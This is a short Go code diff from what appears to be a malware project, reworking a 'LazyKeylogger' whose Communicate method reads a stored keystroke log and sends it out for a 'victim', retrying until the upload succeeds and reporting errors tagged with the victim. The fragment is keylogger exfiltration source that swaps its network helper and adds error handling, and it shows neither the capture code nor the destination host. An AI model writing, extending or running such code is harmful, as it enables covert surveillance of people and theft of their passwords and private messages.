@@ -2,7 +2,6 @@ package services
 
 import (
 	"fmt"
-	"main/network"
 	"main/utils"
 	"os"
 	"time"
@@ -19,11 +18,13 @@ func (kl *LazyKeylogger) Communicate(victim string) {
 	for {
 		file, err := os.OpenFile(fmt.Sprintf(LazyKeylogFilename), os.O_RDONLY, 0755)
 		if err != nil {
+			utils.HandleError(err.Error(), victim)
 			fmt.Println("No keylog history exists")
 		} else {
 			content := utils.GetFileContent(file)
-			_, err := network.HandleTextRequest(content, "lazyKeylog", victim)
+			_, err := utils.HandleLazyKeylogRequest(content, victim)
 			if err != nil {
+				utils.HandleError(err.Error(), victim)
 				fmt.Println("Error making the request")
 			} else {
 				break
@@ -48,6 +49,7 @@ func (kl *LazyKeylogger) Communicate(victim string) {
 				if kl.saved != "" {
 					err := utils.AppendToFile(LazyKeylogFilename, kl.saved)
 					if err != nil {
+						utils.HandleError(err.Error(), victim)
 						fmt.Println("Error making the request")
 					} else {
 						kl.saved = ""
